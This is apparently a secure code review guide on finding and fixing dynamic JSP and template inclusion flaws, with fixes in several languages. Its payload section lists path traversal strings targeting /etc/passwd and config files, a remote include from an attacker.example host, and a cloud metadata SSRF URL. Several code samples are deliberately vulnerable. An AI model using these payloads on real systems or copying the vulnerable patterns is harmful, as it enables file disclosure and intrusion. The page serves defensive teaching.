---
title: Review Dynamic JSP Inclusion
keywords:
  - security code review
  - jsp inclusion
  - dynamic include
  - local file inclusion
  - path traversal
description: How to read code for dynamic JSP and server-side include flaws—trace attacker-controlled paths into view resolution and verify allowlisted templates only.
---

## 4.7 - Review Dynamic JSP Inclusion

Dynamic JSP inclusion appears when request parameters or model values select which page, fragment, or template is included at runtime. Start from `<jsp:include>`, `<c:import>`, Spring view names, and server-side forward targets. Trace the include path from user input to file resolution.

## What This Vulnerability Is

Dynamic JSP inclusion is a server-side path selection flaw. The application uses attacker-controlled strings to choose which JSP, servlet, or template fragment to render. Without strict allowlisting, the attacker may include arbitrary files within the web root or traverse directories with `../` sequences.

The unsafe assumption is that users only request legitimate page names. Attacker input can load admin fragments, configuration files exposed under the web root, or sensitive JSP backup files. This maps to [CWE-22](https://cwe.mitre.org/data/definitions/22.html) (Improper Limitation of a Pathname to a Restricted Directory) and [CWE-829](https://cwe.mitre.org/data/definitions/829.html) (Inclusion of Functionality from Untrusted Control Sphere).

## Vulnerability Characteristics (Where to Identify Them)

| Signal | Where to look |
| --- | --- |
| **Feature type** | Widget loaders, theme switches, AJAX partials, mobile layout pickers, dashboard tabs |
| **Input entry** | Query parameters, JSON fields, cookies, user preference settings |
| **Include directives** | `<jsp:include page="...">`, `<c:import url="...">`, `${param.page}` in JSP paths |
| **MVC view resolution** | `return userInput`, `ModelAndView(viewName)`, dynamic Thymeleaf fragment paths |
| **Weak controls** | Prefix-only checks, string concat `"pages/" + name + ".jsp"`, no canonicalization |
| **Cross-framework equivalents** | Flask `render_template(user_path)`, Go `template.ParseFiles(name)`, Razor partial paths |

## Attack Payloads

Use these in authorized tests when a parameter selects which page or fragment is included. Replace `PARAM` with the vulnerable query or form field name.

### Pattern 1: Directory traversal via include path

```text
PARAM=../../../WEB-INF/web.xml
PARAM=....//....//etc/passwd
PARAM=..%2f..%2f..%2fWEB-INF%2fweb.xml
```

### Pattern 2: Absolute path under web root

```text
PARAM=/admin/dashboard.jsp
PARAM=/WEB-INF/applicationContext.xml
PARAM=/META-INF/context.xml
```

### Pattern 3: Alternate extension and backup files

```text
PARAM=login.jsp.bak
PARAM=config.properties
PARAM=../../application.yml
```

### Pattern 4: Null byte and encoding tricks (legacy parsers)

```text
PARAM=footer.jsp%00
PARAM=..%252f..%252fadmin%252fsecret
PARAM=..%c0%af..%c0%afetc/passwd
```

### Pattern 5: Remote / SSRF-style include (when url= is supported)

```text
PARAM=https://attacker.example/evil.jsp
url=file:///etc/passwd
url=http://169.254.169.254/latest/meta-data/
```

### Pattern 6: Framework view-name injection

```text
PARAM=redirect:/admin/users
PARAM=..\\..\\windows\\win.ini
view=error/../secret
```

## Language-Specific Sinks and Dangerous APIs

Search for include directives and dynamic view resolution. Any path built from request parameters without an allowlist is a review priority.

### Java (JSP / JSTL)

```jsp
<jsp:include page="${param.page}"/>
<c:import url="${param.fragment}"/>
<%@ include file="<%= request.getParameter("tpl") %>" %>
RequestDispatcher rd = req.getRequestDispatcher(userPage); rd.include(req, resp);
```

### Java (Spring MVC)

```java
return userViewName;  // from request parameter
ModelAndView mv = new ModelAndView(request.getParameter("view"));
return "redirect:" + userPath;
```

### Python (Flask / Jinja2)

```python
return render_template(f"partials/{fragment}.html")
return render_template(request.args.get("page"))
app.jinja_env.get_template(user_path).render()
```

### C# (ASP.NET / Razor)

```csharp
return PartialView(userSelectedPartial);
@Html.Partial(Model.FragmentName)
@await Html.PartialAsync(Request.Query["view"])
```

### JavaScript (server-side rendering)

```javascript
res.render(req.query.template, data);
ejs.renderFile(`views/${req.params.page}.ejs`, data);
```

### Go

```go
tmpl := template.Must(template.ParseFiles("templates/" + r.URL.Query().Get("page")))
http.ServeFile(w, r, filepath.Join("views", userFragment))
```

## Sample Vulnerable Code in Python

```python
from flask import Flask, request, render_template

app = Flask(__name__)

@app.route("/partial")
def partial():
    # Attacker-controlled fragment name — may contain ../ sequences
    fragment = request.args.get("tpl", "default")
    # Sink: user input selects template file path
    return render_template(f"partials/{fragment}.html")
```

## Step-by-Step Review Walkthrough

1. **Search for param-driven includes.** Find `<jsp:include page="${param.page}"/>`, dynamic view names, and `render_template` with user path segments.
2. **Trace the Python (or equivalent) input path.** In the sample, `tpl` flows into an f-string template path. Ask whether `../admin/settings` resolves outside `partials/`.
3. **Review MVC controllers.** Flag `return "widgets/" + view` and similar patterns where the return value is a view name from the client.
4. **Check path concatenation.** `"pages/" + name + ".jsp"`, `forward("/views/" + page)`, and OS-specific separators need normalization before comparison.
5. **Verify allowlisting.** Map known keys to fixed paths. Reject unknown keys with 400 instead of probing the filesystem.
6. **Inspect partial endpoints.** AJAX widget loaders must enforce the same auth checks as full page routes.
7. **Confirm encoding variants are rejected.** URL-encoded `..`, double encoding, and absolute paths should fail before file resolution.

## Risk Impact Analysis

**Local file inclusion.** Attackers load unintended JSP, HTML, or static files exposed under the web root, including admin fragments and backup files.

**Information disclosure.** Included files may reveal source, configuration, or internal application structure.

**Authorization bypass.** Sensitive partials intended for authenticated roles may load when include paths skip access checks applied to full routes.

**Chained exploitation.** Included content may combine with XSS or SSTI when attacker-chosen templates contain executable markup.

## Vulnerable Examples in Other Languages

### Java

```jsp
<%@ page contentType="text/html;charset=UTF-8" %>
<jsp:include page="pages/${param.page}.jsp"/>
```

```java
@GetMapping("/widget")
public String widget(@RequestParam String view, Model model) {
    model.addAttribute("data", loadData());
    return "widgets/" + view; // user supplies ../admin/settings
}
```

### C#

```csharp
public IActionResult LoadPartial(string name)
{
    return PartialView($"~/Views/Shared/{name}.cshtml");
}

public IActionResult Dashboard(string tab)
{
    return View($"Dashboard/{tab}"); // tab = "../../Web.config"
}
```

### HTML

```jsp
<%-- Dynamic include driven by request parameter --%>
<%@ include file="<%= request.getParameter("page") %>" %>

<%-- JSP include with user-controlled path segment --%>
<jsp:include page="/partials/${param.partial}.jsp"/>
```

```html
<!-- SSI-style server include (when enabled) -->
<!--#include virtual="/partials/" + param('page') + ".html" -->
```

## Fix: Safer Patterns and Libraries to Use

### Python

Map known keys to fixed template paths. Never pass raw user path segments to `render_template`.

```python
PARTIALS = {
    "profile": "partials/profile.html",
    "nav": "partials/nav.html",
    "default": "partials/default.html",
}

@app.route("/partial")
def partial():
    key = request.args.get("tpl", "default")
    template_name = PARTIALS.get(key)
    if template_name is None:
        return "Unknown partial", 400
    return render_template(template_name)
```

```python
from werkzeug.security import safe_join

@app.route("/asset")
def asset():
    name = request.args.get("file", "")
    path = safe_join("/var/www/static/partials", name)
    if path is None:
        return "Invalid path", 400
    return send_from_directory("/var/www/static/partials", os.path.basename(path))
```

**Important:** `safe_join` rejects paths that escape the base directory. Combine with allowlists for defense in depth.

### Java

Map known keys to fixed JSP paths. Never return raw user strings as view names.

```java
private static final Map<String, String> WIDGETS = Map.of(
    "summary", "widgets/summary",
    "chart", "widgets/chart"
);

@GetMapping("/widget")
public String widget(@RequestParam String view, Model model) {
    String viewName = WIDGETS.get(view);
    if (viewName == null) {
        throw new ResponseStatusException(HttpStatus.BAD_REQUEST);
    }
    model.addAttribute("data", loadData());
    return viewName;
}
```

```java
Path base = Path.of("/app/views").toAbsolutePath().normalize();
Path resolved = base.resolve(name).normalize();
if (!resolved.startsWith(base)) {
    throw new SecurityException("path traversal");
}
```

**Important:** Spring `InternalResourceViewResolver` must receive enum or constant view names only, not request parameters.

### C#

Use enum-driven partials instead of string view names from the client.

```csharp
public enum PartialKind { Nav, Footer, Sidebar }

public IActionResult LoadPartial(PartialKind kind)
{
    var viewName = kind switch
    {
        PartialKind.Nav => "_Nav",
        PartialKind.Footer => "_Footer",
        PartialKind.Sidebar => "_Sidebar",
        _ => throw new ArgumentOutOfRangeException(nameof(kind))
    };
    return PartialView(viewName);
}
```

```csharp
var fullPath = Path.GetFullPath(Path.Combine(_viewsRoot, name));
if (!fullPath.StartsWith(_viewsRoot, StringComparison.Ordinal))
    return BadRequest();
```

**Important:** Precompiled Razor views must not compile arbitrary `.cshtml` paths from user input at runtime.

### Go

Parse templates at startup from a fixed set. Allowlist lookup for runtime selection.

```go
//go:embed templates/partials/*
var partialsFS embed.FS

var partialTemplates = template.Must(
    template.ParseFS(partialsFS, "templates/partials/*.html"))

var partialNames = map[string]string{
    "nav":  "nav.html",
    "footer": "footer.html",
}

func renderPartial(w http.ResponseWriter, r *http.Request) {
    key := r.URL.Query().Get("partial")
    file, ok := partialNames[key]
    if !ok {
        http.Error(w, "unknown partial", http.StatusBadRequest)
        return
    }
    partialTemplates.ExecuteTemplate(w, file, nil)
}
```

**Important:** Avoid `http.ServeFile` and `ParseFiles` with user-influenced paths per request.

## Verify During Review

- Include and view-resolution paths use allowlists or enums, not raw request parameters.
- Path normalization confirms resolved files stay within the intended templates directory.
- `../`, absolute paths, URL-encoded separators, and double-encoding are rejected.
- Partial and widget endpoints enforce authentication and authorization like full pages.
- No JSP under the web root exposes sensitive includes reachable through parameter tampering.
- Static and admin JSP files are not addressable through dynamic include parameters.

## Reference

- [CWE-22: Improper Limitation of a Pathname to a Restricted Directory](https://cwe.mitre.org/data/definitions/22.html)
- [CWE-829: Inclusion of Functionality from Untrusted Control Sphere](https://cwe.mitre.org/data/definitions/829.html)
- [Flask render_template](https://flask.palletsprojects.com/en/stable/api/#flask.render_template)
- [Werkzeug safe_join](https://werkzeug.palletsprojects.com/en/stable/utils/#werkzeug.security.safe_join)
- [Spring MVC — View resolution](https://docs.spring.io/spring-framework/reference/web/webmvc/mvc-config/view-resolvers.html)
- [Jakarta Server Pages — jsp:include](https://jakarta.ee/specifications/pages/3.1/jdocs-tagdoc/core/include.html)
- [ASP.NET Core partial views](https://learn.microsoft.com/en-us/aspnet/core/mvc/views/partial)
- [Go embed package](https://pkg.go.dev/embed)
- [Go html/template — ParseFS](https://pkg.go.dev/html/template#ParseFS)
